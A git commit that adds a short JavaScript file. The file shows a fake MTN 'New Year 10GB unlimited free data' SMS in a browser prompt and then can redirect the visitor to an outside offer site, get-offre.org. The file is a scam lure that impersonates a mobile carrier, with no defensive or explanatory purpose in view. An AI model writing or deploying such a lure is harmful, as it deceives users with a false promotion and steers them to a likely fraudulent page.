daf8bb5c5f302f2b0d0d3a47fa3e71d8be7a816e
trafficbank <153836234+trafficbank@users.noreply.github.com>
2024-12-31 11:44:54 -0800

    Create mtn-newyr-active.js

---
+++ mtn-newyr-active.js
@@ -0,0 +1,6 @@
+
+var password = 'ACTIVATE UNLIMITED DATA'
+password=prompt('SMS: Congratulations You are qualify for MTN New Year 10GB 1-Months Unlimited Free Data , Kindly Press OK to Activate now   ','ACTIVATE UNLIMITED DATA');
+if (password != 'ACTIVATE UNLIMITED DATA') {
+location.href='https://get-offre.org/mtn-newyr.html';
+}
